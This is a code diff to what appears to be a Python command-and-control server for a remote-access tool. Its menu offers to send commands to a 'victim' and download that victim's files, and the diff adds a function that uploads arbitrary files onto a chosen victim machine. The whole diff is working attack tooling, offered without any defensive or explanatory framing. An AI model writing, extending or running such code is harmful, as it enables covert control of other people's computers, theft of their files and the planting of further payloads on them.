@@ -1,7 +1,7 @@
 import socket
 import threading
 from typing import List
-
+import time
 
 
 HOST=socket.gethostbyname(socket.gethostname())
@@ -32,7 +32,8 @@ def showing_menu():
     print("1.show the number of connectiones")
     print("2.send a command to a victim")
     print("3.download a file")
-    print("4.exit")
+    print("4.upload a file")
+    print("5.exit")
 
 
 
@@ -61,6 +62,24 @@ def sending_the_command(index:int,massage:str):
     temp.sendall(massage.encode(FORMAT))
 
 
+def uploading_the_file(file_name:str,destination:str,index:int):
+    temp=list_of_clients[index]
+    file=open(file_name,"rb")
+    final_name_manipulating=file_name.split("\\")
+    final_name=final_name_manipulating[-1]
+    print(final_name)
+    temp.send(('upload '+final_name+' '+destination).encode())
+    time.sleep(1)
+    data=file.read()
+    temp.sendall(data)
+    print("data sent")
+    temp.send(b"<END>")
+    print("the code sent")
+    file.close()
+    print("file closed")
+
+
+
 
 def reciving_the_result(index:int):
     global list_of_clients
@@ -69,7 +88,7 @@ def reciving_the_result(index:int):
     print(data)
 
 def getting_the_file_name():
-    print("enter the file name yu want to download")
+    print("enter the file name you want to download")
     name=input()
     return name
 
@@ -104,6 +123,8 @@ def reciving_the_file(index:int,destination=str):
     print("file closed")
 
 
+ 
+
 
 
 def program_handler():
@@ -126,7 +147,14 @@ def program_handler():
             sending_download_request(ind-1,file_name) 
             reciving_the_file(ind-1,destination)           
         if(choice==4):
-            pass
+            file_name=getting_the_file_name()
+            destination=getting_the_destination()
+            ind=getting_the_user_index()
+            uploading_the_file(file_name,destination,ind-1)
+
+
+
+            
 
 
 
@@ -140,7 +168,6 @@ def start():
     x=0
     while 1:
         x=x+1
-    
     
     
 start()
